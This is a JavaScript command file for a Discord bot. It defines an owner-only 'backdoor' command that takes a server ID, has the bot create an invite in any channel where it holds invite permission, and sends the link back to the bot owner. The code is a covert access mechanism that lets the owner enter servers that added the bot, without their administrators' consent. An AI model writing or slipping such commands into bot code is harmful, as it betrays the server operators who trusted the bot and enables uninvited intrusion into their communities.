const { ownerid2, prefix, token } = require("../../botconfig.json");
const { RichEmbed } = require('discord.js')
module.exports = { 
    config: {
        name: "backdoor",
        description: "",
        accessableby: "Bot Owner",
        type: "owner",
        usage: `<id>`,
        category: "owner",
         aliases: ["bd"],
    },
    run: async (bot, message, args) => {
      if(message.author.id == ownerid2) {
let embed = new RichEmbed()
  if(!args[0] || isNaN(args[0]) || args[0].length > 18) return message.channel.send(embed.setColor('RED').setDescription(`Please provide a guild id.`));
let guild = bot.guilds.get(args[0]);
  if(!guild) return message.channel.send(embed.setColor('RED').setDescription(`The bot isn't in that guild.`));
let invitePossiblites = guild.channels.filter(cha => cha.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
  if(!invitePossiblites) return message.channel.send(embed.setColor('RED').setDescription(`Couldn't fetch a channel that allowed me to make an invite.`));
    
      try {
    invitePossiblites.random().createInvite()
      .then(invite => {
      message.channel.send(embed.setColor('GREEN').setDescription(`Success! Found an invite! 
      **[invite](${`https://discordapp.com/invite/${invite.code})** || **Code: ${invite.code}**`}`));
      }) 
      } catch(err) {
        message.channel.send(embed.setColor('RED').setDescription(`Couldn't make invite.`))
      }
      } else {
        message.reply("No No No")
      }
    }
}